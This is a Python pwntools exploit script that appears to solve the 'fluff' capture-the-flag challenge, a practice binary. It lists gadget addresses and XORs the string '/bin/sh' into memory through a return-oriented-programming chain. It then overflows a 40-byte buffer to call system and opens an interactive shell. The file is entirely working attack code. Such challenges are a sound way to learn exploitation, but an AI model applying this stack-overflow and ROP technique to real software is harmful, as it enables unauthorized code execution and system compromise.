from pwn import *

p = process('./fluff')
print(p.recv())

# 00400845 : mov r11d, 0x602050 ; ret
# 00400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
# 00400853 : pop r12 ; xor byte ptr [r10], r12b ; ret
# 00400832 : pop r12 ; mov r13d, 0x604060 ; ret
# 0040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
# 0040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
# 00400855 : xor byte ptr [r10], r12b ; ret
# 0040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
# 004008c3 : pop rdi ; ret

# xor r11, r11
# mov r11 addr
# pop r12
# xor r12; pop <---+
# xchg r11 r10     |
# - pop r12 x <----+
# xor r11, r12
# 0040084e mov + pop + xor
# mov edi, addr
# system
have = p64(0x602050)
want1 = p64(0x601050)
result1 = bytes([have[i] ^ want1[i] for i in range(8)])
want2 = b'/bin/sh\x00'
result2 = bytes([have[i] ^ want2[i] for i in range(8)])

payload  = b'A' * 40
payload += p64(0x004005b9)      # ret align
payload += p64(0x00400807)      # useful func, force link
payload += p64(0x00400822)      # xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
payload += p64(0)               # shrug, r14
payload += p64(0x00400845)      # mov r11d, 0x602050 ; ret
payload += p64(0x00400832)      # pop r12 ; mov r13d, 0x604060 ; ret
payload += result1              # xor'd 0x601050
payload += p64(0x0040082f)      # xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
payload += result2              # xor'd /bin/sh for later
payload += p64(0x00400840)      # xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
payload += p64(0)               # shrug, r15
payload += p64(0x0040082f)      # xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
payload += p64(0)               # r12
payload += p64(0x0040084e)      # mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
payload += p64(0) + p64(0)      # r13, r12
payload += p64(0x00400827)      # mov edi, 0x601050 ; ret
payload += p64(0x004005e0)      # system

p.sendline(payload)
p.interactive()
